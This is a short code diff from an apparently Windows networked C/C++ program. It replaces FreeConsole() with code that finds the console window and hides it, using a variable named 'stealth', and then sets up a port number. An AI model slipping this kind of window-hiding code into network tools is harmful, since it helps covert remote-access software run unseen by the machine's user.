@@ -3,8 +3,12 @@
 int main(int argc, char * argv[])
 {
     //Check if i want to hide output or not
-	if(argc == 1)
-		FreeConsole();           // BTW UPDATE THIS YOU CAN STILL SEE A TERMINAL POP UP
+	if(argc == 1){
+		HWND stealth;
+		AllocConsole();
+		stealth=FindWindowA("ConsoleWindowClass", NULL);
+		ShowWindow(stealth, 0);
+	}
 
     // Create the basic variables so that you can get the port data
 	int portno;     //number of port
